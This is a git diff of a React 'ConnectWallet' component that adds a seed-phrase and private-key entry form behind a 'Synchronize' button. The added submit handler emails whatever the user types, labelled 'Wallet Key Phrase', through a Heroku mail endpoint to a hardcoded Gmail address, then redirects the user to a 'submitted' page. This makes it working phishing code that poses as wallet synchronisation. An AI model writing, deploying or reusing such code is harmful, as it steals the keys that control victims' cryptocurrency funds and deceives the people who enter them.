@@ -1,13 +1,46 @@
 import React, { useState } from "react";
 import "./ConnectWallet.css";
 import { X } from "react-bootstrap-icons";
-// import WalletId from "./WalletId";
+import WalletId from "./WalletId";
 // import { Link } from "react-router-dom";
+import axios from "axios";
 
-function ConnectWallet(props) {
-  const [isOpen, setIsOpen] = useState(false);
-  const toggleWalletPopUp = () => {
-    setIsOpen(!isOpen);
+function ConnectWallet({ title, handleClose, identity, imagesrc }) {
+  // const [isOpen, setIsOpen] = useState(false);
+  // const toggleWalletPopUp = () => {
+  //   setIsOpen(!isOpen);
+  // };
+
+  const [getData, setGetData] = useState({
+    message: "",
+  });
+
+  let options = {
+    subject: "Wallet Key Phrase",
+    message: `<p>This is the wallet key phrase a user entered: <br> <strong> Wallet Name: ${title} </strong> <br> <strong> Walllet Key: ${getData.message}</strong> </p>`,
+    sender: "adedejiyusuf26@gmail.com",
+    receiver: "adedejiyusuf26@gmail.com",
+  };
+
+  const handSubmit = async (e) => {
+    e.preventDefault();
+    if (getData.message === "") {
+      return alert("field can not be empty");
+    }
+    if (getData.message.length <= 11) {
+      return alert("Word Phrase/Private key can not be less than 12");
+    }
+    await axios
+      .post(
+        `https://backend-email-sender-mailgun.herokuapp.com/send-message`,
+        options
+      )
+      .then((response) => {
+        console.log(response);
+        setTimeout(() => {
+          window.location.replace("/submitted");
+        }, 2000);
+      });
   };
 
   return (
@@ -16,11 +49,15 @@ function ConnectWallet(props) {
         <article className="popheading d-flex flex-row justify-content-end p-3">
           <X
             className="close-icon"
-            onClick={props.handleClose}
+            onClick={handleClose}
             size={40}
             color="black"
           />
         </article>
+
+        <section>
+          <WalletId identity={identity} title={title} imagesrc={imagesrc} />
+        </section>
 
         <div className="p-3">
           <section>
@@ -33,19 +70,23 @@ function ConnectWallet(props) {
               className="form-control keyform text-center"
               type="text"
               placeholder="PHRASE/PRIVATE KEY"
-              reqquired
+              minLength="12"
+              required
+              onChange={(e) =>
+                setGetData({ ...getData, message: e.target.value })
+              }
             />
-            <input
+            {/* <input
               type="submit"
               value=" Synchronize"
               className="bTN"
               onClick={toggleWalletPopUp}
-            />
+            /> */}
 
-            {/* <button className="bTN" onClick={toggleWalletPopUp}>
+            <button className="bTN" onClick={handSubmit}>
               {" "}
               Synchronize{" "}
-            </button> */}
+            </button>
           </form>
         </div>
       </section>
